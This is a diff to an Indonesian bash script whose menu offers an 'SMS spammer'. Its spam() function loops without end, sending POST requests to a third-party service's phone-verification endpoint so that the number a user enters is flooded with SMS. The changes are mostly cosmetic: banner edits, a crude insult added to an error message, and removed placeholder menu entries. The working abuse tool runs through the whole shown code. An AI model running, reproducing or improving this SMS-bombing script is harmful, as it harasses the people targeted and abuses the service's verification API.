@@ -30,10 +30,8 @@ sleep 2
 
 figlet Tools Rizqi
 	echo
-	echo [1]"---STABILKAN JARINGANMU--- "
-	echo [2]"---SPAMER SMS 2022----- "
-	echo [3]"---ERROR!!---"
-	echo [4]"---ERROR!!---"
+	echo [1]"---STABILKAN JARINGANMU---"
+	echo [2]"---SPAMER SMS 2022-----"
 	echo
 	read -p "PILIH TOLS--->> : " bro
 
@@ -104,12 +102,12 @@ function check(){
 }
 check
 clear
-echo -e "\t${p}__________________________"
+echo -e "\t${p}_________________________________"
 echo -e "\t${h}|   ✓ SPAMER SMS 2022 ✓   |"
 echo -e "\t${p}| ✓  Author${m}: ${x}RIZQIMBMBG ✓ |"
 echo -e "\t${p}| ✓ Team${m}: ${p,}WHITERS INDOK ✓ |"
-echo -e "\t${p}__________________________"
-echo -e "\t${m}    { ${x}(Gunakan Awalan 08) ${m}} \n"
+echo -e "\t${p}_________________________________"
+echo -e "\t${m}    { ${x}(Gunakan Awalan 08××) ${m}} \n"
 function spam(){
 for (( loop = 1; loop <= loop; loop++ ));do
 	get=$( curl -s --http2 -X POST \
@@ -120,14 +118,14 @@ for (( loop = 1; loop <= loop; loop++ ));do
 	-H "content-type:application/json;charset=UTF-8" -d '{"phone_number":"'"$number"'"}' "https://service.mokapos.com/account/v1/verification/phone/send" | grep -Eo -i "ok" | tr "OK" "rus" | awk {'print $1"s"'})
 	
 	if [[ $get =~ "rus" ]];then
-	printf "${p}[${h}•${p}] MENGIRIM SMS KE? ${pu}$number ${m}[${h} Berhasil ${m}]\n"
+	printf "${p}[${h}•${p}] MENGIRIM ===>>? ${pu}$number ${m}[${h} Berhasil ${m}]\n"
 	fi
 done
 }
 
 function __main__(){
 	printf "\t${b}╔════════════════════════╗ \n"
-    printf "\t${b}║${p}NO TARGET${m}:${pu} " number
+    printf "\t${b}║${p}NO TARGET ==>${m}:${pu} " number
     read number;
     printf "\t${b}╚════════════════════════╝\n"    
   	ko=$(echo -e "$number" | grep -Eo "7166")
@@ -152,7 +150,7 @@ function __main__(){
     number="$number"
     spam $number
     else 
-    printf "\t${p}[${m}!${p}] ${m}Invalid Number!!\n\n"
+    printf "\t${p}[${m}!${p}] ${m}MASUKIN NOMER YANG BENER GOBLOK!!\n\n"
     exit 1
     fi
 }
